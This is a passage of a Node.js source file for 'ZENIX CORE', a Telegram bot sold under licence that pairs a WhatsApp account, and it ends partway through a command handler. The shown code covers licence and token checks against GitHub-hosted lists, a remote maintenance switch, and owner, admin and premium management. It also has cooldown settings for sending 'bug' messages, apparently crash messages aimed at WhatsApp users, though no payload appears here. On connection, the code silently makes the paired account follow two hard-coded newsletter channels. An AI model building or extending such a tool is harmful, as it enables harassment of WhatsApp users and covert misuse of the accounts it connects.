const { Telegraf, Markup } = require("telegraf");
const fs = require('fs');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
require('./rofik');
const { BOT_TOKEN, allowedDevelopers } = require("./config");
const tdxlol = fs.readFileSync('./tdx.jpeg');
const crypto = require('crypto');
const o = fs.readFileSync(`./o.jpg`)
const usersState = {}; // <--- Ini yang bikin error ilang
// --- Inisialisasi Bot Telegram ---
const delay = (ms) => new Promise(res => setTimeout(res, ms));
const pendingKeys = new Map(); // Untuk simpan user yang nunggu input key

async function withTimeoutRetry(fn, label = 'operation', attempt = 1) {
  try {
    return await fn();
  } catch (err) {
    if (
      err?.output?.statusCode === 408 && attempt < 3 // Timed Out
    ) {
      console.warn(`${label} timeout, retry ${attempt}/3`);
      await delay(4000); // tunggu 4 detik lalu ulang
      return withTimeoutRetry(fn, label, attempt + 1);
    }
    throw err;
  }
}

// --- Variabel Global ---
let rofik = null;
let isWhatsAppConnected = false;
const usePairingCode = true; // Tidak digunakan dalam kode Anda
let premiumUsers = {};
let adminList = [];
let ownerList = [];
let deviceList = [];
let userActivity = {};
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;
let reconnectAttempts = 0; // Pindahkan di luar fungsi startSesi()
const cooldowns = new Map();
const COOLDOWN_TIME = 1 * 1000; // 1 detik cooldown
// Tambahkan di bagian variabel global
const bugCooldowns = new Map(); // Untuk menyimpan cooldown tiap user
const DEFAULT_COOLDOWN = 60; // Default 60 detik
// --- Fungsi-fungsi Bantuan ---
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// --- Fungsi untuk Mengecek Apakah User adalah Owner ---
const isOwner = (userId) => {
    if (ownerList.includes(userId.toString())) {
        ownerataubukan = "✅";
        return true;
    } else {
        ownerataubukan = "❌";
        return false;
    }
};

const OWNER_ID = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ysudh = "✅";
        return true;
    } else {
        gnymbung = "❌";
        return false;
    }
};

// --- Fungsi untuk Mengecek Apakah User adalah Admin ---
const isAdmin = (userId) => {
    if (adminList.includes(userId.toString())) {
        adminataubukan = "✅";
        return true;
    } else {
        adminataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

// --- Fungsi untuk Menambahkan User Premium ---
const addPremiumUser = (userId, durationDays) => {
    // Pastikan userId adalah string
    userId = userId.toString();
    
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

// --- Fungsi untuk Menghapus User Premium ---
const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

// --- Fungsi untuk Mengecek Status Premium ---
const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menyimpan Data User Premium ---
const savePremiumUsers = () => {
    fs.writeFileSync('./premiumUsers.json', JSON.stringify(premiumUsers));
};

// --- Fungsi untuk Memuat Data User Premium ---
const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

// --- Fungsi untuk Memuat Daftar Device ---
const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

// --- Fungsi untuk Menyimpan Daftar Device ---
const saveDeviceList = () => {
    fs.writeFileSync('./ListDevice.json', JSON.stringify(deviceList));
};

// --- Fungsi untuk Menambahkan Device ke Daftar ---
const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({
        number: deviceNumber,
        userId: userId,
        token: token
    });
    saveDeviceList();
    console.log(chalk.white.bold(`
╭──────────────────❍
┃ ${chalk.white.bold('DETECT NEW PERANGKAT')}
┃ ${chalk.white.bold('DEVICE NUMBER: ')} ${chalk.yellow.bold(deviceNumber)}
╰──────────────────❍`));
};

// --- Fungsi untuk Mencatat Aktivitas Pengguna ---
const recordUserActivity = (userId, userNickname) => {
    const now = moment().tz('Asia/Jakarta').format('YYYY-MM-DD HH:mm:ss');
    userActivity[userId] = {
        nickname: userNickname,
        last_seen: now
    };

    // Menyimpan aktivitas pengguna ke file
    fs.writeFileSync('./userActivity.json', JSON.stringify(userActivity));
};

// --- Fungsi untuk Memuat Aktivitas Pengguna ---
const loadUserActivity = () => {
    try {
        const data = fs.readFileSync('./userActivity.json');
        userActivity = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat aktivitas pengguna:'), error);
        userActivity = {};
    }
};

// --- Middleware untuk Mengecek Mode Maintenance ---
const checkMaintenance = async (ctx, next) => {
  try {
    const res = await axios.get('https://raw.githubusercontent.com/GanzJbganteng/id/main/maintenance.json');
    const data = res.data;

    console.log("🛠 Maintenance mode aktif?", data.maintenance_mode, "user:", ctx.from.id);

    if (data.maintenance_mode) {
      return await ctx.reply(data.message || "⛔ Bot sedang maintenance.");
    }
  } catch (e) {
    console.error("Maintenance check failed:", e.message);
  }

  await next();
};
// --- Middleware untuk Mengecek Status Premium ---
const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("❌ Maaf, Anda bukan user premium. Silakan hubungi developer @rofikos untuk upgrade.");
    }
};

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/GanzJbganteng/db-zenixx/main/database.json";
const bot = new Telegraf(BOT_TOKEN);
bot.use(checkMaintenance); // Middleware untuk mengecek maintenance
// 

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens || [];
  } catch (error) {
    console.error(chalk.red("PENYUSUP YA?", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("Loading Check Token Bot..."));

  const validTokens = await fetchValidTokens();
  
  if (!BOT_TOKEN || !validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⠤⠤⢤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⡶⠛⠉⠀⠀⠀⠀⠀⠀⠈⠙⠲⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⢀⢖⡿⠛⠻⣿⣶⣄⠀⠀⢀⣴⣶⣶⣶⣶⣄⠀⠀⢻⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣜⢸⣇⣀⣠⣿⣿⣿⣆⣰⡏⠀⢹⣿⣿⣿⣿⣿⡀⣾⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠘⣿⡘⣿⣿⣿⣿⢿⣿⣿⣿⣿⣾⣿⣿⡛⢻⣿⢸⣷⡇⠀⠀⠀⠀⠀⠀
⠀⣤⠤⣼⠉⠷⣌⣻⠿⣿⣦⣼⡿⠘⢿⣿⣿⣿⠿⢛⣥⣾⣿⣀⢀⣠⣤⡀⠀⠀
⠈⠧⣄⡀⠀⠀⠈⠻⢭⣉⠉⠁⠀⠀⠀⠉⢉⣙⣯⠿⠛⠁⠀⠉⠉⠁⢸⡇⠀⠀
⠀⢀⡞⠁⠀⠀⠀⢀⣴⠈⠑⠀⠀⠚⠛⠋⠉⠉⠘⣶⢢⡄⠀⠀⠀⠀⠀⠉⢲⡀
⠀⠘⠧⠴⠞⢦⡀⣸⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⣹⠂⠀⠀⠀⢰⠶⠚⠁
⠀⠀⠀⠀⠀⠀⠛⢃⡿⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⣇⢿⣰⠾⠷⣆⣸⠆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⢈⡿⠉⠉⠉⠙⠛⢲⡒⠀⠈⢷⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠦⠴⠛⠁⠀⠀⠀⠀⠀⠀⠛⠦⢤⠼⠃⠀⠀⠀⠀⠀⠀⠀
TOKEN LU GK TERDAFTAR NJIR\nNONTON BOKEP AJA DARI PADAN MAIN BUG HASIL NYOLONG`));
    process.exit(1);
  }

  console.log(chalk.green(`⠀⠀⠀⠀⠀⠀
　
▒█▀▀█ ▒█▀▀▀ ▒█▄░▒█ ▒█▀▀▀█ ▒█▀▀▀█ ▒█▀▀▀█
▒█▄▄█ ▒█▀▀▀ ▒█▒█▒█ ░▀▀▀▄▄ ░▀▀▀▄▄ ▒█░░▒█
▒█░░░ ▒█▄▄▄ ▒█░░▀█ ▒█▄▄▄█ ▒█▄▄▄█ ▒█▄▄▄█
        [ ZΞNIX   C0RΞ ]⠀⠀⠀`));
  startBot();
}

function startBot() {
  console.log(chalk.green("THX TELAH MEMBELI SCRIPT INI"));
}

validateToken();

        
// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
      version,
      keepAliveIntervalMs: 30000,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }), 
      auth: state,
      browser: ['Mac OS', 'Safari', '10.15.7'],
      getMessage: async (key) => ({
          conversation: 'P', 
      }),
  };

  rofik = makeWASocket(connectionOptions);

  rofik.ev.on('creds.update', saveCreds);
  store.bind(rofik.ev);

  rofik.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    const MAX_RECONNECT_ATTEMPTS = 3;
 
    const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
 
    if (connection === 'open') {
  isWhatsAppConnected = true;
  reconnectAttempts = 0;
  console.log(chalk.white.bold(`
╭──「 𝗦𝗧𝗔𝗧𝗨𝗦 」
┃  WHATSAPP CONNECTED
╰─────────────────❍`));

  try {
    await withTimeoutRetry(
      () => rofik.newsletterFollow("120363419911095044@newsletter"),
      "follow-newsletter-1"
    );

    await withTimeoutRetry(
      () => rofik.newsletterFollow("120363401578298288@newsletter"),
      "follow-newsletter-2"
    );

    console.log("✅  Sukses auto-follow channel");
  } catch (err) {
    console.error("❌ Gagal auto-follow:", err);
  }
}
 
    if (connection === 'close') {
        isWhatsAppConnected = false;
        
        // Cek jika terdeteksi logout
        if (lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut) {
            console.log(chalk.red.bold(`
╭─────────────────❍
┃ 🚫 WHATSAPP LOGGED OUT
╰─────────────────❍`));
 
            // Kirim notifikasi ke owner
            for (const ownerId of allowedDevelopers) {
                try {
                    await bot.telegram.sendMessage(ownerId, `
╭──「 𝗦𝗧𝗔𝗧𝗨𝗦  」
┃ • STATUS: TERDETEKSI LOGOUT 🚫
┃ • Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YY HH:mm:ss')} WIB
╰─────────────────❍`, {
                        parse_mode: "Markdown",
                        reply_markup: {
                            inline_keyboard: [
                                [{ text: "❌ Close", callback_data: "close" }]
                            ]
                        }
                    });
                } catch (notifError) {
                    console.error(chalk.red.bold(`Gagal mengirim notifikasi ke owner ${ownerId}:`, notifError));
                }
            }
 
            // Hapus file session
            const sessionPath = './session';
            try {
                fs.rmSync(sessionPath, { recursive: true, force: true });
                console.log(chalk.yellow.bold(`
╭─────────────────❍
┃ ALL FILE BERHASIL DI DELETE ✅
╰─────────────────❍`));
            } catch (error) {
                console.error(chalk.red.bold(`
╭─────────────────❍
┃ ❌ GAGAL MENGHAPUS SESION
┃ EROR: ${error.message}
╰─────────────────❍`));
            }
 
            rofik = null;
            reconnectAttempts = 0;
            return; // Stop reconnection attempts
        }
 
        // Handle reconnection for non-logout disconnects
        if (shouldReconnect) {
            reconnectAttempts++;
 
            console.log(
                chalk.white.bold(`
╭─────────────────❍
┃   ${chalk.red.bold('WHATSAPP DISCONNECTED')}
┃   Percobaan Reconnect: ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS}
╰─────────────────❍`)
            );
 
            if (reconnectAttempts >= MAX_RECONNECT_ATTEMPTS) {
                console.log(chalk.red.bold(`
╭─────────────────❍
┃ NOMOR WHATSAPP BANNED 🚫 
╰─────────────────❍`));
 
                // Kirim notifikasi ke owner
                for (const ownerId of allowedDevelopers) {
                    try {
                        await bot.telegram.sendMessage(ownerId, `
╭──「 𝗦𝗧𝗔𝗧𝗨𝗦  」
┃ • STATUS: TERDETEKSI BANNED 🚫 
┃ • Waktu: ${moment().tz('Asia/Jakarta').format('DD/MM/YY HH:mm:ss')} WIB
┃ • Percobaan: ${reconnectAttempts}/${MAX_RECONNECT_ATTEMPTS}
╰─────────────────❍`, {
                            parse_mode: "Markdown",
                            reply_markup: {
                                inline_keyboard: [
                                    [{ text: "❌ Close", callback_data: "close" }]
                                ]
                            }
                        });
                    } catch (notifError) {
                        console.error(chalk.red.bold(`Gagal mengirim notifikasi ke owner ${ownerId}:`, notifError));
                    }
                }
 
                // Hapus file session
                const sessionPath = './session';
                try {
                    fs.rmSync(sessionPath, { recursive: true, force: true });
                    console.log(chalk.yellow.bold(`
╭─────────────────❍
┃ ALL FILE BERHASIL DI DELETE ✅
╰─────────────────❍`));
                } catch (error) {
                    console.error(chalk.red.bold(`
╭─────────────────❍
┃ ❌ GAGAL MENGHAPUS SESION
┃ EROR: ${error.message}
╰─────────────────❍`));
                }
 
                isWhatsAppConnected = false;
                rofik = null;
                reconnectAttempts = 0;
            } else {
                setTimeout(() => {
                    startSesi();
                }, 5000);
            }
        } else {
            console.log(
                chalk.white.bold(`
╭─────────────────❍
┃   ${chalk.red.bold('WHATSAPP LOGGED OUT')}
╰─────────────────❍`)
            );
            
            // Hapus session ketika logout
            const sessionPath = './session';
            try {
                fs.rmSync(sessionPath, { recursive: true, force: true });
                console.log(chalk.yellow.bold(`
╭─────────────────❍
┃ ALL FILE BERHASIL DI DELETE ✅
╰─────────────────❍`));
            } catch (error) {
                console.error(chalk.red.bold(`
╭─────────────────❍
┃ ❌ GAGAL MENGHAPUS SESION
┃ EROR: ${error.message}
╰─────────────────❍`));
            }
            
            isWhatsAppConnected = false;
            rofik = null;
            reconnectAttempts = 0;
        }
    }
  });
}

(async () => {
  console.log(chalk.red.bold(`
▒█▀▀█ ▒█▀▀▀ ▒█▄░▒█ ▒█▀▀▀█ ▒█▀▀▀█ ▒█▀▀▀█
▒█▄▄█ ▒█▀▀▀ ▒█▒█▒█ ░▀▀▀▄▄ ░▀▀▀▄▄ ▒█░░▒█
▒█░░░ ▒█▄▄▄ ▒█░░▀█ ▒█▄▄▄█ ▒█▄▄▄█ ▒█▄▄▄█
        [ ZΞNIX   C0RΞ ]
 `));

  // Validasi BOT_TOKEN
  if (!BOT_TOKEN || BOT_TOKEN === '' || BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE') {
      console.log(chalk.red.bold(`
╭═══════════════════════════════════════╮
┃             ⚠️ ERROR ⚠️               ┃
┃                                       ┃
┃ Bot Token Tidak ditemukan atau tidak  ┃
┃ valid di file config.js               ┃
┃                                       ┃
┃ Silakan isi BOT_TOKEN dengan token    ┃
┃ yang valid dari @BotFather           ┃
┃                                       ┃
╰═══════════════════════════════════════╯`));
      process.exit(1); // Hentikan program jika token tidak valid
  }

  console.log(chalk.white.bold(`
╭──「 𝗦𝗧𝗔𝗧𝗨𝗦  」
┃ ${chalk.cyanBright.bold('LOADING DATABASE')}
╰─────────────────❍`));

  try {
      loadPremiumUsers();
      loadAdmins();
      loadDeviceList();
      loadUserActivity();
      
      startSesi();

      // Menambahkan device ke ListDevice.json saat inisialisasi
      addDeviceToList(BOT_TOKEN, BOT_TOKEN);
      
      console.log(chalk.white.bold(`
╭──「 𝗦𝗧𝗔𝗧𝗨𝗦  」
┃ ${chalk.greenBright.bold('SYSTEM READY !!')}
╰─────────────────❍`));
  } catch (error) {
      console.error(chalk.red.bold(`
╭═══════════════════════════════════════╮
┃             ⚠️ ERROR ⚠️               ┃
┃                                       ┃
┃ Terjadi kesalahan saat inisialisasi:  ┃
┃ ${error.message}
╰═══════════════════════════════════════╯`));
      process.exit(1);
  }
})();
// --- Command Handler ---

// Command untuk pairing WhatsApp
// Command handler untuk addpairing





async function checkKeyValidity(key) {
  try {
    const { data } = await axios.get("https://raw.githubusercontent.com/GanzJbganteng/id/main/auth.json");
    return data.find(entry => entry.KEY === key && entry.STATUS === "active");
  } catch (e) {
    console.error("Gagal ambil database KEY:", e.message);
    return null;
  }
}

bot.command("addpairing", async (ctx) => {
  const userId = ctx.from.id;

  if (rofik && rofik.user) {
    return await ctx.reply(`✅ WhatsApp sudah terhubung.\n\nNama: ${rofik.user.name || 'Tidak diketahui'}\nNomor: ${rofik.user.id.split(":")[0]}`);
  }

  pendingKeys.set(userId, { attempts: 3, step: "key" });
  return await ctx.reply("🔐 Masukkan lisensi KEY Anda:");
});

bot.on("text", async (ctx) => {
  const userId = ctx.from.id;
  const state = pendingKeys.get(userId);
  const text = ctx.message.text?.trim();

  if (!state) return;

  // STEP 1: Validasi KEY
  if (state.step === "key") {
    const result = await checkKeyValidity(text);

    if (!result) {
      state.attempts--;
      if (state.attempts <= 0) {
        pendingKeys.delete(userId);
        return await ctx.reply("🚫 KEY salah. Akses ditolak.");
      }
      return await ctx.reply(`❌ KEY tidak valid. Sisa percobaan: ${state.attempts}`);
    }

    pendingKeys.set(userId, { ...state, step: "number" });
    return await ctx.reply("✅ KEY valid!\n\n📞 Masukkan nomor WhatsApp (format: 62xxxx):");
  }

  // STEP 2: Proses nomor dan pairing
  if (state.step === "number") {
    let phoneNumber = text.replace(/[^0-9]/g, '');
    if (phoneNumber.length < 8) {
      return await ctx.reply("❌ Nomor telepon tidak valid. Minimal 8 digit.");
    }
    if (!phoneNumber.startsWith("62")) phoneNumber = "62" + phoneNumber;

    if (!rofik) {
      try {
        await startSesi(); // fungsi inisialisasi WhatsApp
        await new Promise(res => setTimeout(res, 3000));
      } catch (err) {
        console.error("Gagal inisialisasi WA:", err.message);
        return await ctx.reply("❌ Gagal menghubungkan WhatsApp.");
      }
    }

    try {
      const code = await rofik.requestPairingCode(phoneNumber);
      const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

      pendingKeys.delete(userId);
      await ctx.replyWithPhoto("https://img1.pixhost.to/images/6514/611451276_kurosay.jpg", {
        caption: `╭──「 𝗣𝗔𝗜𝗥𝗜𝗡𝗚 𝗖𝗢𝗗𝗘 」\n┃ Nomor: ${phoneNumber}\n┃ Kode: \`${formattedCode}\`\n╰─────────────────❍`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]]
        }
      });
    } catch (e) {
      console.error("Gagal pairing:", e.message);
      await ctx.reply("❌ Gagal pairing. Pastikan nomor valid dan coba lagi.");
    }
  }
});

// Handler untuk tombol close
bot.action("close", async (ctx) => {
  try {
      await ctx.deleteMessage();
  } catch (error) {
      console.error(chalk.red('Gagal menghapus pesan:'), error);
  }
});

// Command /addowner - Menambahkan owner baru
bot.command("addowner", async (ctx) => {
  if (!OWNER_ID(ctx.from.id)) {
      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  let userId;
  
  // Cek jika command merupakan reply ke pesan
  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } 
  // Cek jika ada username/mention atau ID yang diberikan
  else {
      const args = ctx.message.text.split(" ")[1];
      
      if (!args) {
          return await ctx.reply(`❌ Format perintah salah. Gunakan: /addowner <id_days>`);
      }

      // Jika input adalah username (dimulai dengan @)
      if (args.startsWith("@")) {
          try {
              const username = args.slice(1); // Hapus @ dari username
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } 
      // Jika input adalah ID langsung
      else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  // Cek apakah user sudah terdaftar sebagai owner
  if (ownerList.includes(userId)) {
      return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
  }

  try {
      // Dapatkan info user untuk ditampilkan
      const user = await ctx.telegram.getChat(userId);
      ownerList.push(userId);
      await saveOwnerList();

      const successMessage = `
╭──「 𝗔𝗗𝗗 𝗢𝗪𝗡𝗘𝗥 」
┃
┃ ✅ BERHASIL MENAMBAH OWNER 
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗢𝘄𝗻𝗲𝗿:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
┃ • Nama: ${user.first_name}${user.last_name ? ' ' + user.last_name : ''}
╰─────────────────❍`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "📋 List Owner", callback_data: "listowner" }],
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });

  } catch (error) {
      console.error('Error adding owner:', error);
      await ctx.reply("❌ Gagal menambahkan owner. Pastikan ID/Username valid dan bot memiliki akses yang diperlukan.");
  }
});

bot.command("setjeda", async (ctx) => {
  // Permission check
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  const args = ctx.message.text.split(/\s+/);
  if (args.length < 2 || isNaN(args[1])) {
      return await ctx.reply(`
╭❌ Format perintah salah. Gunakan: /setjeda <detik>`);
  }

  const newCooldown = parseInt(args[1]);
  
  // Validasi input
  if (newCooldown < 10 || newCooldown > 3600) {
      return await ctx.reply("❌ Jeda harus antara 10 - 3600 detik!");
  }

  bugCooldown = newCooldown;
  await ctx.reply(`
╭──「 𝗦𝗘𝗧 𝗝𝗘𝗗𝗔 」
│ • Status: Berhasil ✅
│ • Jeda: ${bugCooldown} detik
╰──────────────────❍`);
});

// Command /addadmin - Menambahkan admin baru
bot.command("addadmin", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  let userId;
  
  // Cek jika command merupakan reply ke pesan
  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } 
  // Cek jika ada username/mention atau ID yang diberikan
  else {
      const args = ctx.message.text.split(" ")[1];
      
      if (!args) {
          return await ctx.reply(`❌ Format perintah salah. Gunakan: /addadmin <id_days>`);
      }

      // Jika input adalah username (dimulai dengan @)
      if (args.startsWith("@")) {
          try {
              const username = args.slice(1); // Hapus @ dari username
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } 
      // Jika input adalah ID langsung
      else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  // Cek apakah user sudah terdaftar sebagai admin
  if (adminList.includes(userId)) {
      return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai admin.`);
  }

  try {
      // Dapatkan info user untuk ditampilkan
      const user = await ctx.telegram.getChat(userId);
      addAdmin(userId);

      const successMessage = `
╭──「 𝗔𝗗𝗗 𝗔𝗗𝗠𝗜𝗡  」
┃
┃ ✅ BERHASIL MENAMBAH ADMIN
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗔𝗱𝗺𝗶𝗻:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
┃ • Nama: ${user.first_name}${user.last_name ? ' ' + user.last_name : ''}
╰─────────────────❍`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "📋 List Admin", callback_data: "listadmin" }],
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });

  } catch (error) {
      console.error('Error adding admin:', error);
      await ctx.reply("❌ Gagal menambahkan admin. Pastikan ID/Username valid dan bot memiliki akses yang diperlukan.");
  }
});

// Delete Premium Command
bot.command("delprem", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
      return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
  }

  let userId;

  // Cek jika command merupakan reply ke pesan
  if (ctx.message.reply_to_message) {
      userId = ctx.message.reply_to_message.from.id.toString();
  } else {
      const args = ctx.message.text.split(" ")[1];
      if (!args) {
          return await ctx.reply(`❌ Format perintah salah. Gunakan: /delprem <id>`);
      }

      // Jika input adalah username
      if (args.startsWith("@")) {
          try {
              const username = args.slice(1);
              const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, `@${username}`);
              userId = chatMember.user.id.toString();
          } catch (error) {
              return await ctx.reply("❌ Username tidak ditemukan atau bukan member dari grup ini.");
          }
      } else {
          if (!/^\d+$/.test(args)) {
              return await ctx.reply("❌ ID harus berupa angka!");
          }
          userId = args;
      }
  }

  // Cek apakah user adalah premium
  if (!premiumUsers[userId]) {
      return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai user premium.`);
  }

  try {
      const user = await ctx.telegram.getChat(userId);
      removePremiumUser(userId);

      const successMessage = `
╭──「  𝗗𝗘𝗟𝗘𝗧𝗘 𝗣𝗥𝗘𝗠 」
┃
┃ ✅ BERHASIL MENGHAPUS PREM
┃ 𝗗𝗲𝘁𝗮𝗶𝗹 𝗨𝘀𝗲𝗿:
┃ • ID: ${userId}
┃ • Username: ${user.username ? '@' + user.username : 'Tidak ada'}
┃ • Nama: ${user.first_name}${user.last_name ? ' ' + user.last_name : ''}
╰─────────────────❍`;

      await ctx.replyWithMarkdown(successMessage, {
          reply_markup: {
              inline_keyboard: [
                  [{ text: "📋 List Premium", callback_data: "listprem" }],
                  [{ text: "❌ Close", callback_data: "close" }]
              ]
          }
      });
  } catch (error) {
      console.error('Error removing premium:', error);
      await ctx.reply("❌ Gagal menghapus premium. Pastikan ID/Username valid.");
  }
});

// Delete Admin Command
bot.command("deladmin", async (ctx) => {
  if (!OWNER_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
